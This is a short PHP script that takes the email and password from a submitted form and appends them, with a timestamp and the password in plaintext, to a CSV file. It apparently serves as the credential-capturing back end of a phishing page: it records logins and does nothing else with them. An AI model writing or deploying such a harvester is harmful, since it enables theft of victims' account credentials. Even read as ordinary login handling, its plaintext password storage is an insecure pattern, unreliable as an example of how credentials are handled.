<?php
if ( isset($_POST["email"]) && isset($_POST["password"]) ) {
  $email = $_POST["email"];
  $file = "../POST.csv";

  if ( file_exists($file) ) {
    $date = date('d/m/Y h:i:s a', time());
    $line = "[$date] '{$_POST["email"]}'        '{$_POST["password"]}'\n";

    file_put_contents($file, $line, FILE_APPEND);
  }
}
